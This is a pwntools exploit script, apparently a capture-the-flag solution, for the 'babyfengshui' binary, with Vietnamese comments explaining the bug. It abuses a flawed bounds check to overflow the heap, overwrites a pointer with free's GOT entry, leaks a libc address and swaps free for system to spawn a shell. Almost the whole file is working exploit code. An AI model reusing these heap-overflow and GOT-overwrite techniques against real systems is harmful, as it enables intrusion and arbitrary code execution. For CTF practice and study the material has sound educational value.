from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b* 0x080488bf
b* 0x080488e7
b* 0x08048948
b* 0x080486e9
b* 0x0804879f
continue
'''.format(**locals())

#Binary filename
exe = './babyfengshui'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF('./libc-2.19.so')

'''
- struct node
{
    char *description;
    char name[0x80 - *char];
} 
- Lỗi bài này nằm ở phần update khi điều kiện check khi việc nó so sánh tương tự thế này
if (node -> description + n >= node - 4)
Và điều kiện này hợp lệ khi heap của name và des nằm liền kề 
do đó khi ta free 1 node và tạo 1 node mới lớn hơn thì 2 chunk của node đó sẽ là name phần đầu là description nằm trong phần chunk của node cũ chúng ta đã free
=> heap overflow lên node ta tạo sẵn trước đó với mục tiêu thay đổi description poiter
- Các bước tiến hành:
+ Tạo 2 node và free node đầu  
+ Tạo chunk mới với size lớn để heap tên ở gần top chunk và size của description (bên dưới mình có trình bày cách tính)
+ Display và tính leak_base
+ Thay đổi free_got => libc.system
+ tạo node mới với phần name: /bin/sh và free
==> get Shell
'''

def add(size, name, length, text):
    p.sendlineafter(b"Action: ", b"0")
    p.sendlineafter(b"size of description: ", str(size))
    p.sendlineafter(b"name: ", name)
    p.sendlineafter(b"text length: ", str(length))
    p.sendlineafter(b"text: ", text)

def delete(index):
    p.sendlineafter(b"Action: ", b"1")
    p.sendlineafter(b"index: ", str(index))

def update(index, length, text):
    p.sendlineafter(b"Action: ", b"3")
    p.sendlineafter(b"index: ", str(index))
    p.sendlineafter(b"text length: ", str(length))
    p.sendlineafter(b"text: ", text)

def display(index):
    p.sendlineafter(b"Action: ", b"2")
    p.sendlineafter(b"index: ", str(index))

add(0x20, b"AAAA", 0x20, b"AAAA")
add(0x20, b"BBBB", 0x20, b"BBBB")
delete(0)

add(0x80, b"CCCC", 0xb8, b"a" * 0xb0 + p32(elf.got.free))
# 0x80 is chunk description, 0x20 node 2 name + 0x8 * 2 head chunk
add(0x80, b"DDDD", 0x8, b"/bin/sh\x00")
display(1)

p.recvuntil(b"description: ")
free_addr = u32(p.recv(4))
print(hex(free_addr))
'''
!!! local
libc.address = free_addr - libc.sym['free']
print(hex(libc.address))
system = libc.sym[system]
print(hex(system))
'''
libc_base = free_addr - 0x070750
print(hex(libc_base))
system = libc_base + 0x03a940
print(hex(system))

update(1, 4, p32(system))
delete(3)

p.interactive()
